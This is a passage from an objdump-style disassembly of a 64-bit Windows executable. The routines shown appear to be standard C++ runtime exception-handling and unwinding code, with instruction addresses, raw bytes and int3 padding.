   1400056e9:	0f 11 02             	movups %xmm0,(%rdx)
   1400056ec:	e8 4f 07 00 00       	call   0x140005e40
   1400056f1:	48 8b c3             	mov    %rbx,%rax
   1400056f4:	48 83 c4 20          	add    $0x20,%rsp
   1400056f8:	5b                   	pop    %rbx
   1400056f9:	c3                   	ret
   1400056fa:	cc                   	int3
   1400056fb:	cc                   	int3
   1400056fc:	48 8d 05 8d c5 00 00 	lea    0xc58d(%rip),%rax        # 0x140011c90
   140005703:	48 89 01             	mov    %rax,(%rcx)
   140005706:	48 83 c1 08          	add    $0x8,%rcx
   14000570a:	e9 b9 07 00 00       	jmp    0x140005ec8
   14000570f:	cc                   	int3
   140005710:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005715:	57                   	push   %rdi
   140005716:	48 83 ec 20          	sub    $0x20,%rsp
   14000571a:	48 8d 05 6f c5 00 00 	lea    0xc56f(%rip),%rax        # 0x140011c90
   140005721:	48 8b f9             	mov    %rcx,%rdi
   140005724:	48 89 01             	mov    %rax,(%rcx)
   140005727:	8b da                	mov    %edx,%ebx
   140005729:	48 83 c1 08          	add    $0x8,%rcx
   14000572d:	e8 96 07 00 00       	call   0x140005ec8
   140005732:	f6 c3 01             	test   $0x1,%bl
   140005735:	74 0d                	je     0x140005744
   140005737:	ba 18 00 00 00       	mov    $0x18,%edx
   14000573c:	48 8b cf             	mov    %rdi,%rcx
   14000573f:	e8 34 91 00 00       	call   0x14000e878
   140005744:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005749:	48 8b c7             	mov    %rdi,%rax
   14000574c:	48 83 c4 20          	add    $0x20,%rsp
   140005750:	5f                   	pop    %rdi
   140005751:	c3                   	ret
   140005752:	cc                   	int3
   140005753:	cc                   	int3
   140005754:	40 53                	rex push %rbx
   140005756:	56                   	push   %rsi
   140005757:	57                   	push   %rdi
   140005758:	41 54                	push   %r12
   14000575a:	41 55                	push   %r13
   14000575c:	41 56                	push   %r14
   14000575e:	41 57                	push   %r15
   140005760:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140005767:	48 8b f9             	mov    %rcx,%rdi
   14000576a:	45 33 ff             	xor    %r15d,%r15d
   14000576d:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140005772:	44 89 bc 24 d0 00 00 	mov    %r15d,0xd0(%rsp)
   140005779:	00 
   14000577a:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   14000577f:	4c 89 bc 24 e0 00 00 	mov    %r15,0xe0(%rsp)
   140005786:	00 
   140005787:	e8 50 e8 ff ff       	call   0x140003fdc
   14000578c:	4c 8b 68 28          	mov    0x28(%rax),%r13
   140005790:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   140005795:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   14000579a:	e8 3d e8 ff ff       	call   0x140003fdc
   14000579f:	48 8b 40 20          	mov    0x20(%rax),%rax
   1400057a3:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400057a8:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400057ad:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400057b2:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   1400057b6:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   1400057bb:	48 89 b4 24 d8 00 00 	mov    %rsi,0xd8(%rsp)
   1400057c2:	00 
   1400057c3:	48 8b 47 48          	mov    0x48(%rdi),%rax
   1400057c7:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   1400057ce:	00 
   1400057cf:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400057d4:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   1400057d8:	48 8b 47 30          	mov    0x30(%rdi),%rax
   1400057dc:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400057e1:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   1400057e5:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1400057ea:	48 8b cb             	mov    %rbx,%rcx
   1400057ed:	e8 92 e7 ff ff       	call   0x140003f84
   1400057f2:	e8 e5 e7 ff ff       	call   0x140003fdc
   1400057f7:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400057fb:	e8 dc e7 ff ff       	call   0x140003fdc
   140005800:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140005804:	e8 d3 e7 ff ff       	call   0x140003fdc
   140005809:	48 8b 50 20          	mov    0x20(%rax),%rdx
   14000580d:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   140005811:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140005818:	00 
   140005819:	e8 e6 ed ff ff       	call   0x140004604
   14000581e:	4c 8b e0             	mov    %rax,%r12
   140005821:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005826:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   14000582a:	74 1c                	je     0x140005848
   14000582c:	c7 84 24 d0 00 00 00 	movl   $0x1,0xd0(%rsp)
   140005833:	01 00 00 00 
   140005837:	e8 a0 e7 ff ff       	call   0x140003fdc
   14000583c:	48 8b 48 70          	mov    0x70(%rax),%rcx
   140005840:	48 89 8c 24 e0 00 00 	mov    %rcx,0xe0(%rsp)
   140005847:	00 
   140005848:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   14000584e:	49 8b d6             	mov    %r14,%rdx
   140005851:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005856:	e8 a5 05 00 00       	call   0x140005e00
   14000585b:	48 8b d8             	mov    %rax,%rbx
   14000585e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005863:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140005868:	eb 78                	jmp    0x1400058e2
   14000586a:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140005871:	00 
   140005872:	e8 65 e7 ff ff       	call   0x140003fdc
   140005877:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%rax)
   14000587e:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140005885:	00 
   140005886:	83 bc 24 d0 00 00 00 	cmpl   $0x0,0xd0(%rsp)
   14000588d:	00 
   14000588e:	74 0f                	je     0x14000589f
   140005890:	b2 01                	mov    $0x1,%dl
   140005892:	e8 1d e5 ff ff       	call   0x140003db4
   140005897:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   14000589e:	00 
   14000589f:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   1400058a3:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   1400058a7:	8b 51 04             	mov    0x4(%rcx),%edx
   1400058aa:	8b 09                	mov    (%rcx),%ecx
   1400058ac:	ff 15 46 a8 00 00    	call   *0xa846(%rip)        # 0x1400100f8
   1400058b2:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   1400058b7:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   1400058bc:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   1400058c1:	4c 8b 6c 24 48       	mov    0x48(%rsp),%r13
   1400058c6:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400058cb:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400058d0:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1400058d5:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   1400058dc:	00 
   1400058dd:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   1400058e2:	49 8b cc             	mov    %r12,%rcx
   1400058e5:	e8 56 ed ff ff       	call   0x140004640
   1400058ea:	45 85 ff             	test   %r15d,%r15d
   1400058ed:	75 32                	jne    0x140005921
   1400058ef:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   1400058f5:	75 2a                	jne    0x140005921
   1400058f7:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   1400058fb:	75 24                	jne    0x140005921
   1400058fd:	8b 46 20             	mov    0x20(%rsi),%eax
   140005900:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140005905:	83 f8 02             	cmp    $0x2,%eax
   140005908:	77 17                	ja     0x140005921
   14000590a:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   14000590e:	e8 15 e5 ff ff       	call   0x140003e28
   140005913:	85 c0                	test   %eax,%eax
   140005915:	74 0a                	je     0x140005921
   140005917:	b2 01                	mov    $0x1,%dl
   140005919:	48 8b ce             	mov    %rsi,%rcx
   14000591c:	e8 93 e4 ff ff       	call   0x140003db4
   140005921:	e8 b6 e6 ff ff       	call   0x140003fdc
   140005926:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000592a:	e8 ad e6 ff ff       	call   0x140003fdc
   14000592f:	4c 89 68 28          	mov    %r13,0x28(%rax)
   140005933:	48 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%rax
   14000593a:	00 
   14000593b:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   14000593f:	49 8b 06             	mov    (%r14),%rax
   140005942:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   140005949:	ff 
   14000594a:	48 8b c3             	mov    %rbx,%rax
   14000594d:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140005954:	41 5f                	pop    %r15
   140005956:	41 5e                	pop    %r14
   140005958:	41 5d                	pop    %r13
   14000595a:	41 5c                	pop    %r12
   14000595c:	5f                   	pop    %rdi
   14000595d:	5e                   	pop    %rsi
   14000595e:	5b                   	pop    %rbx
   14000595f:	c3                   	ret
   140005960:	40 53                	rex push %rbx
   140005962:	48 83 ec 20          	sub    $0x20,%rsp
   140005966:	4c 8b 09             	mov    (%rcx),%r9
   140005969:	49 8b d8             	mov    %r8,%rbx
   14000596c:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140005971:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
   140005978:	41 39 09             	cmp    %ecx,(%r9)
   14000597b:	75 61                	jne    0x1400059de
   14000597d:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140005982:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   140005988:	75 1c                	jne    0x1400059a6
   14000598a:	41 8b 41 20          	mov    0x20(%r9),%eax
   14000598e:	41 2b c0             	sub    %r8d,%eax
   140005991:	83 f8 02             	cmp    $0x2,%eax
   140005994:	77 10                	ja     0x1400059a6
   140005996:	48 8b 42 28          	mov    0x28(%rdx),%rax
   14000599a:	49 39 41 28          	cmp    %rax,0x28(%r9)
   14000599e:	75 06                	jne    0x1400059a6
   1400059a0:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400059a6:	41 39 09             	cmp    %ecx,(%r9)
   1400059a9:	75 33                	jne    0x1400059de
   1400059ab:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   1400059b0:	75 2c                	jne    0x1400059de
   1400059b2:	41 8b 49 20          	mov    0x20(%r9),%ecx
   1400059b6:	41 2b c8             	sub    %r8d,%ecx
   1400059b9:	83 f9 02             	cmp    $0x2,%ecx
   1400059bc:	77 20                	ja     0x1400059de
   1400059be:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   1400059c3:	75 19                	jne    0x1400059de
   1400059c5:	e8 12 e6 ff ff       	call   0x140003fdc
   1400059ca:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   1400059d1:	b8 01 00 00 00       	mov    $0x1,%eax
   1400059d6:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400059dc:	eb 02                	jmp    0x1400059e0
   1400059de:	33 c0                	xor    %eax,%eax
   1400059e0:	48 83 c4 20          	add    $0x20,%rsp
   1400059e4:	5b                   	pop    %rbx
   1400059e5:	c3                   	ret
   1400059e6:	cc                   	int3
   1400059e7:	cc                   	int3
   1400059e8:	48 8b c4             	mov    %rsp,%rax
   1400059eb:	44 89 48 20          	mov    %r9d,0x20(%rax)
   1400059ef:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400059f3:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400059f7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400059fb:	53                   	push   %rbx
   1400059fc:	56                   	push   %rsi
   1400059fd:	57                   	push   %rdi
   1400059fe:	41 54                	push   %r12
   140005a00:	41 55                	push   %r13
   140005a02:	41 56                	push   %r14
   140005a04:	41 57                	push   %r15
   140005a06:	48 83 ec 40          	sub    $0x40,%rsp
   140005a0a:	45 8b e1             	mov    %r9d,%r12d
   140005a0d:	49 8b f0             	mov    %r8,%rsi
   140005a10:	4c 8b ea             	mov    %rdx,%r13
   140005a13:	4c 8b f9             	mov    %rcx,%r15
   140005a16:	e8 79 ec ff ff       	call   0x140004694
   140005a1b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005a20:	4c 8b c6             	mov    %rsi,%r8
   140005a23:	49 8b d5             	mov    %r13,%rdx
   140005a26:	49 8b cf             	mov    %r15,%rcx
   140005a29:	e8 46 ed ff ff       	call   0x140004774
   140005a2e:	8b f8                	mov    %eax,%edi
   140005a30:	e8 a7 e5 ff ff       	call   0x140003fdc
   140005a35:	ff 40 30             	incl   0x30(%rax)
   140005a38:	83 ff ff             	cmp    $0xffffffff,%edi
   140005a3b:	0f 84 f9 00 00 00    	je     0x140005b3a
   140005a41:	41 3b fc             	cmp    %r12d,%edi
   140005a44:	0f 8e f0 00 00 00    	jle    0x140005b3a
   140005a4a:	83 ff ff             	cmp    $0xffffffff,%edi
   140005a4d:	0f 8e 25 01 00 00    	jle    0x140005b78
   140005a53:	3b 7e 04             	cmp    0x4(%rsi),%edi
   140005a56:	0f 8d 1c 01 00 00    	jge    0x140005b78
   140005a5c:	e8 33 ec ff ff       	call   0x140004694
   140005a61:	4c 63 f7             	movslq %edi,%r14
   140005a64:	49 c1 e6 03          	shl    $0x3,%r14
   140005a68:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140005a6c:	49 03 ce             	add    %r14,%rcx
   140005a6f:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   140005a72:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140005a76:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140005a7a:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140005a7e:	e8 11 ec ff ff       	call   0x140004694
   140005a83:	49 03 c6             	add    %r14,%rax
   140005a86:	83 7c 18 04 00       	cmpl   $0x0,0x4(%rax,%rbx,1)
   140005a8b:	74 1b                	je     0x140005aa8
   140005a8d:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140005a91:	e8 fe eb ff ff       	call   0x140004694
   140005a96:	49 03 c6             	add    %r14,%rax
   140005a99:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140005a9e:	e8 f1 eb ff ff       	call   0x140004694
   140005aa3:	48 03 c3             	add    %rbx,%rax
   140005aa6:	eb 02                	jmp    0x140005aaa
   140005aa8:	33 c0                	xor    %eax,%eax
   140005aaa:	48 85 c0             	test   %rax,%rax
   140005aad:	74 5c                	je     0x140005b0b
   140005aaf:	44 8b cf             	mov    %edi,%r9d
   140005ab2:	4c 8b c6             	mov    %rsi,%r8
   140005ab5:	49 8b d5             	mov    %r13,%rdx
   140005ab8:	49 8b cf             	mov    %r15,%rcx
   140005abb:	e8 08 ed ff ff       	call   0x1400047c8
   140005ac0:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140005ac4:	e8 cb eb ff ff       	call   0x140004694
   140005ac9:	49 03 c6             	add    %r14,%rax
   140005acc:	83 7c 18 04 00       	cmpl   $0x0,0x4(%rax,%rbx,1)
   140005ad1:	74 1b                	je     0x140005aee
   140005ad3:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140005ad7:	e8 b8 eb ff ff       	call   0x140004694
   140005adc:	49 03 c6             	add    %r14,%rax
   140005adf:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140005ae4:	e8 ab eb ff ff       	call   0x140004694
   140005ae9:	48 03 c3             	add    %rbx,%rax
   140005aec:	eb 02                	jmp    0x140005af0
   140005aee:	33 c0                	xor    %eax,%eax
   140005af0:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   140005af6:	49 8b d7             	mov    %r15,%rdx
   140005af9:	48 8b c8             	mov    %rax,%rcx
   140005afc:	e8 ff 02 00 00       	call   0x140005e00
   140005b01:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005b06:	e8 b1 eb ff ff       	call   0x1400046bc
   140005b0b:	eb 24                	jmp    0x140005b31
   140005b0d:	44 8b a4 24 98 00 00 	mov    0x98(%rsp),%r12d
   140005b14:	00 
   140005b15:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
   140005b1c:	00 
   140005b1d:	4c 8b ac 24 88 00 00 	mov    0x88(%rsp),%r13
   140005b24:	00 
   140005b25:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   140005b2c:	00 
   140005b2d:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140005b31:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140005b35:	e9 fe fe ff ff       	jmp    0x140005a38
   140005b3a:	e8 9d e4 ff ff       	call   0x140003fdc
   140005b3f:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140005b43:	7e 08                	jle    0x140005b4d
   140005b45:	e8 92 e4 ff ff       	call   0x140003fdc
   140005b4a:	ff 48 30             	decl   0x30(%rax)
   140005b4d:	83 ff ff             	cmp    $0xffffffff,%edi
   140005b50:	74 05                	je     0x140005b57
   140005b52:	41 3b fc             	cmp    %r12d,%edi
   140005b55:	7f 27                	jg     0x140005b7e
   140005b57:	44 8b cf             	mov    %edi,%r9d
   140005b5a:	4c 8b c6             	mov    %rsi,%r8
   140005b5d:	49 8b d5             	mov    %r13,%rdx
   140005b60:	49 8b cf             	mov    %r15,%rcx
   140005b63:	e8 60 ec ff ff       	call   0x1400047c8
   140005b68:	48 83 c4 40          	add    $0x40,%rsp
   140005b6c:	41 5f                	pop    %r15
   140005b6e:	41 5e                	pop    %r14
   140005b70:	41 5d                	pop    %r13
   140005b72:	41 5c                	pop    %r12
   140005b74:	5f                   	pop    %rdi
   140005b75:	5e                   	pop    %rsi
   140005b76:	5b                   	pop    %rbx
   140005b77:	c3                   	ret
   140005b78:	e8 73 17 00 00       	call   0x1400072f0
   140005b7d:	90                   	nop
   140005b7e:	e8 6d 17 00 00       	call   0x1400072f0
   140005b83:	90                   	nop
   140005b84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005b89:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005b8e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005b93:	57                   	push   %rdi
   140005b94:	48 83 ec 20          	sub    $0x20,%rsp
   140005b98:	48 8b e9             	mov    %rcx,%rbp
   140005b9b:	49 8b f8             	mov    %r8,%rdi
   140005b9e:	49 8b c8             	mov    %r8,%rcx
   140005ba1:	48 8b f2             	mov    %rdx,%rsi
   140005ba4:	e8 67 ec ff ff       	call   0x140004810
   140005ba9:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140005bae:	4c 8b c7             	mov    %rdi,%r8
   140005bb1:	48 8b d6             	mov    %rsi,%rdx
   140005bb4:	48 8b cd             	mov    %rbp,%rcx
   140005bb7:	8b d8                	mov    %eax,%ebx
   140005bb9:	e8 26 e7 ff ff       	call   0x1400042e4
   140005bbe:	4c 8b c7             	mov    %rdi,%r8
   140005bc1:	48 8b d6             	mov    %rsi,%rdx
   140005bc4:	48 8b cd             	mov    %rbp,%rcx
   140005bc7:	e8 d0 eb ff ff       	call   0x14000479c
   140005bcc:	4c 8b c7             	mov    %rdi,%r8
   140005bcf:	48 8b d6             	mov    %rsi,%rdx
   140005bd2:	3b d8                	cmp    %eax,%ebx
   140005bd4:	7e 20                	jle    0x140005bf6
   140005bd6:	44 8b cb             	mov    %ebx,%r9d
   140005bd9:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005bde:	e8 e5 eb ff ff       	call   0x1400047c8
   140005be3:	44 8b cb             	mov    %ebx,%r9d
   140005be6:	4c 8b c7             	mov    %rdi,%r8
   140005be9:	48 8b d6             	mov    %rsi,%rdx
   140005bec:	48 8b cd             	mov    %rbp,%rcx
   140005bef:	e8 e0 eb ff ff       	call   0x1400047d4
   140005bf4:	eb 0a                	jmp    0x140005c00
   140005bf6:	48 8b cd             	mov    %rbp,%rcx
   140005bf9:	e8 9e eb ff ff       	call   0x14000479c
   140005bfe:	8b d8                	mov    %eax,%ebx
   140005c00:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005c05:	8b c3                	mov    %ebx,%eax
   140005c07:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005c0c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005c11:	48 83 c4 20          	add    $0x20,%rsp
   140005c15:	5f                   	pop    %rdi
   140005c16:	c3                   	ret
   140005c17:	cc                   	int3
   140005c18:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005c1d:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005c22:	55                   	push   %rbp
   140005c23:	56                   	push   %rsi
   140005c24:	57                   	push   %rdi
   140005c25:	41 54                	push   %r12
   140005c27:	41 55                	push   %r13
   140005c29:	41 56                	push   %r14
   140005c2b:	41 57                	push   %r15
   140005c2d:	48 83 ec 20          	sub    $0x20,%rsp
   140005c31:	4c 8b f2             	mov    %rdx,%r14
   140005c34:	48 8b f9             	mov    %rcx,%rdi
   140005c37:	48 85 d2             	test   %rdx,%rdx
   140005c3a:	0f 84 b1 00 00 00    	je     0x140005cf1
   140005c40:	45 32 e4             	xor    %r12b,%r12b
   140005c43:	33 ed                	xor    %ebp,%ebp
   140005c45:	39 2a                	cmp    %ebp,(%rdx)
   140005c47:	0f 8e 8c 00 00 00    	jle    0x140005cd9
   140005c4d:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140005c51:	4c 63 68 0c          	movslq 0xc(%rax),%r13
   140005c55:	e8 4e ea ff ff       	call   0x1400046a8
   140005c5a:	48 83 c0 04          	add    $0x4,%rax
   140005c5e:	4c 03 e8             	add    %rax,%r13
   140005c61:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140005c65:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140005c69:	e8 3a ea ff ff       	call   0x1400046a8
   140005c6e:	44 8b 3c 18          	mov    (%rax,%rbx,1),%r15d
   140005c72:	45 85 ff             	test   %r15d,%r15d
   140005c75:	7e 57                	jle    0x140005cce
   140005c77:	48 63 c5             	movslq %ebp,%rax
   140005c7a:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140005c7e:	48 c1 e0 02          	shl    $0x2,%rax
   140005c82:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140005c87:	49 63 75 00          	movslq 0x0(%r13),%rsi
   140005c8b:	e8 18 ea ff ff       	call   0x1400046a8
   140005c90:	48 8b 7f 30          	mov    0x30(%rdi),%rdi
   140005c94:	48 03 f0             	add    %rax,%rsi
   140005c97:	49 63 5e 04          	movslq 0x4(%r14),%rbx
   140005c9b:	e8 f4 e9 ff ff       	call   0x140004694
   140005ca0:	48 03 44 24 68       	add    0x68(%rsp),%rax
   140005ca5:	4c 8b c7             	mov    %rdi,%r8
   140005ca8:	48 8b d6             	mov    %rsi,%rdx
   140005cab:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140005caf:	e8 54 f6 ff ff       	call   0x140005308
   140005cb4:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140005cb9:	85 c0                	test   %eax,%eax
   140005cbb:	75 0e                	jne    0x140005ccb
   140005cbd:	41 ff cf             	dec    %r15d
   140005cc0:	49 83 c5 04          	add    $0x4,%r13
   140005cc4:	45 85 ff             	test   %r15d,%r15d
   140005cc7:	7f be                	jg     0x140005c87
   140005cc9:	eb 03                	jmp    0x140005cce
   140005ccb:	41 b4 01             	mov    $0x1,%r12b
   140005cce:	ff c5                	inc    %ebp
   140005cd0:	41 3b 2e             	cmp    (%r14),%ebp
   140005cd3:	0f 8c 74 ff ff ff    	jl     0x140005c4d
   140005cd9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140005cde:	41 8a c4             	mov    %r12b,%al
   140005ce1:	48 83 c4 20          	add    $0x20,%rsp
   140005ce5:	41 5f                	pop    %r15
   140005ce7:	41 5e                	pop    %r14
   140005ce9:	41 5d                	pop    %r13
   140005ceb:	41 5c                	pop    %r12
   140005ced:	5f                   	pop    %rdi
   140005cee:	5e                   	pop    %rsi
   140005cef:	5d                   	pop    %rbp
   140005cf0:	c3                   	ret
   140005cf1:	e8 fa 15 00 00       	call   0x1400072f0
   140005cf6:	cc                   	int3
   140005cf7:	cc                   	int3
   140005cf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005cfd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005d02:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005d07:	57                   	push   %rdi
   140005d08:	48 83 ec 20          	sub    $0x20,%rsp
   140005d0c:	33 ff                	xor    %edi,%edi
   140005d0e:	48 8b f1             	mov    %rcx,%rsi
   140005d11:	39 39                	cmp    %edi,(%rcx)
   140005d13:	7e 59                	jle    0x140005d6e
   140005d15:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   140005d19:	48 63 c7             	movslq %edi,%rax
   140005d1c:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140005d20:	48 8d 2c 8d 00 00 00 	lea    0x0(,%rcx,4),%rbp
   140005d27:	00 
   140005d28:	e8 67 e9 ff ff       	call   0x140004694
   140005d2d:	48 03 c3             	add    %rbx,%rax
   140005d30:	83 7c 28 04 00       	cmpl   $0x0,0x4(%rax,%rbp,1)
   140005d35:	74 1b                	je     0x140005d52
   140005d37:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   140005d3b:	e8 54 e9 ff ff       	call   0x140004694
   140005d40:	48 03 c5             	add    %rbp,%rax
   140005d43:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140005d48:	e8 47 e9 ff ff       	call   0x140004694
   140005d4d:	48 03 c3             	add    %rbx,%rax
   140005d50:	eb 02                	jmp    0x140005d54
   140005d52:	33 c0                	xor    %eax,%eax
   140005d54:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140005d58:	48 8d 15 e9 8c 01 00 	lea    0x18ce9(%rip),%rdx        # 0x14001ea48
   140005d5f:	e8 28 e0 ff ff       	call   0x140003d8c
   140005d64:	85 c0                	test   %eax,%eax
   140005d66:	74 1d                	je     0x140005d85
   140005d68:	ff c7                	inc    %edi
   140005d6a:	3b 3e                	cmp    (%rsi),%edi
   140005d6c:	7c a7                	jl     0x140005d15
   140005d6e:	32 c0                	xor    %al,%al
   140005d70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d75:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005d7a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005d7f:	48 83 c4 20          	add    $0x20,%rsp
   140005d83:	5f                   	pop    %rdi
   140005d84:	c3                   	ret
   140005d85:	b0 01                	mov    $0x1,%al
   140005d87:	eb e7                	jmp    0x140005d70
   140005d89:	cc                   	int3
   140005d8a:	cc                   	int3
   140005d8b:	cc                   	int3
   140005d8c:	48 8b c2             	mov    %rdx,%rax
   140005d8f:	49 8b d0             	mov    %r8,%rdx
   140005d92:	48 ff e0             	rex.W jmp *%rax
   140005d95:	cc                   	int3
   140005d96:	cc                   	int3
   140005d97:	cc                   	int3
   140005d98:	49 8b c0             	mov    %r8,%rax
   140005d9b:	4c 8b d2             	mov    %rdx,%r10
   140005d9e:	48 8b d0             	mov    %rax,%rdx
   140005da1:	45 8b c1             	mov    %r9d,%r8d
   140005da4:	49 ff e2             	rex.WB jmp *%r10
   140005da7:	cc                   	int3
   140005da8:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140005dad:	48 8d 05 ec be 00 00 	lea    0xbeec(%rip),%rax        # 0x140011ca0
   140005db4:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140005db9:	c3                   	ret
   140005dba:	cc                   	int3
   140005dbb:	cc                   	int3
   140005dbc:	cc                   	int3
   140005dbd:	cc                   	int3
   140005dbe:	cc                   	int3
   140005dbf:	cc                   	int3
   140005dc0:	cc                   	int3
   140005dc1:	cc                   	int3
   140005dc2:	cc                   	int3
   140005dc3:	cc                   	int3
   140005dc4:	cc                   	int3
   140005dc5:	cc                   	int3
   140005dc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005dcd:	00 00 00 
   140005dd0:	cc                   	int3
   140005dd1:	cc                   	int3
   140005dd2:	cc                   	int3
   140005dd3:	cc                   	int3
   140005dd4:	cc                   	int3
   140005dd5:	cc                   	int3
   140005dd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005ddd:	00 00 00 
   140005de0:	cc                   	int3
   140005de1:	cc                   	int3
   140005de2:	cc                   	int3
   140005de3:	cc                   	int3
   140005de4:	cc                   	int3
   140005de5:	cc                   	int3
   140005de6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005ded:	00 00 00 
   140005df0:	cc                   	int3
   140005df1:	cc                   	int3
   140005df2:	cc                   	int3
   140005df3:	cc                   	int3
   140005df4:	cc                   	int3
   140005df5:	cc                   	int3
   140005df6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
